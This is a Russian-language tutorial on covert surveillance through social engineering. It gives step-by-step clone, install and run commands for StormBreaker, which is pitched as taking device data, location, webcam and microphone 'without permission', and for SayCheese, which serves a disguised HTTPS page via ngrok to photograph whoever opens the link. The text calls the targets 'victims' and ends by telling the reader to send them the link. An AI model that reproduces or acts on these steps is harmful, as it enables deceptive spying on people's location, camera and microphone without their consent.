Для более дерзкого сбора информации посредством СИ, нам потребуется во-первых войти в контакт с целью, во-вторых тщательно продумать предлоги, под которыми пришлём ту или иную ссылку. Для подобных дел часто любят использовать простые логгеры вроде [**canarytokens**](http://canarytokens.org/generate) и [**iplogger**](https://iplogger.org/). Но можно поступить более изящно и изобретательно. В этом поможет инструмент **[StormBreaker](**https://github.com/ultrasecurity/Storm-Breaker**)**. Нам понадобиться лишь клонировать репозиторий, установить модули через `pip install -r` `requirements.txt` и запустить сам `st.py`.  

Переходим к панели управления на локальном хосте. Стандартные логин и пароль admin.

# Storm-Breaker
## Введение

https://github.com/ultrasecurity/Storm-Breaker - фреймворк для "активного" OSINT-а.

Возможности: 
Получение информации об устройстве без разрешения! 
Доступ к местоположению \[SMARTPHONES] 
Доступ к веб-камере 
Доступ к микрофону

## Default username and password:

- `username` : `admin`
- `password` : `admin`
- Вы можете отредактировать файл config.php, чтобы изменить имя пользователя и пароль.

### Dependencies

**`Storm Breaker`** requires following programs to run properly -
- `php`
- `python3`
- `git`
- `Ngrok`

### Platforms Tested

- Kali Linux 2022
- macOS Big Sur / M1
- Termux (android)
- Personal host (direct admin and cPanel)  
    

### Installation On Kali Linux

```
git clone https://github.com/ultrasecurity/Storm-Breaker
cd Storm-Breaker
sudo bash install.sh
sudo python3 -m pip install -r requirements.txt
sudo python3 st.py
```

**`how to run personal host 👇`**

> Полностью заархивируйте содержимое папки storm-web и загрузите его по пути public_html.
>  Обратите внимание, что инструмент не должен открываться по пути типа > yourdomain.com/st-web Вместо этого он должен открываться исключительно по пути public_html (т.е.: не просто застегивайте саму папку storm-web, а вручную застегните ее содержимое (файл index.php и другие элементы должны находиться по пути public_html).

> Обратите внимание, что для использования этого инструмента на локальном хосте вам также необходим SSL. Потому что многие возможности инструмента требуют SSL.

> Чтобы запустить ngrok на termux, необходимо включить персональную точку доступа и сотовую сеть.

---

# # SayCheese

## Введение

Съемка с веб-камеры цели, просто отправляющей вредоносную ссылку.

**SayCheese** - утилита, которая фотографирует жертву которая перешла по ссылке. Инструмент генерирует вредоносную страницу HTTPS, используя методы переадресации портов Serveo или Ngrok, а также код JavaScript для перехвата запросов с помощью MediaDevices.getUserMedia. Метод MediaDevices.getUserMedia() запрашивает у пользователя разрешение на использование медиавхода, который создает MediaStream с дорожками, содержащими запрошенные типы медиа. Если замаскировать начальную страницу, то жертва будет более доверчивой.

## Установка:

Клонируем репозиторий
``` 
git clone https://github.com/hangetzzu/saycheese
```
Переходим в директорию с проектом
```
cd saycheese
```
Выдаём права на запуск скрипту
```
chmod 114 saycheese.sh
```

## ⚙️Настройка

Для удачного запуска устанавливаем `ngrok`
Далее заходим в файл `saycheese.sh` и на 171 строке удаляем `./` до `ngrok`

## 💻Запуск

Теперь запускаем ngrok на 3333 порту
```
ngrok http 3333
```
и запускаем saycheese выбирая ngrok
```
bash saycheese.sh
```
готово, отправляем ссылку жертве!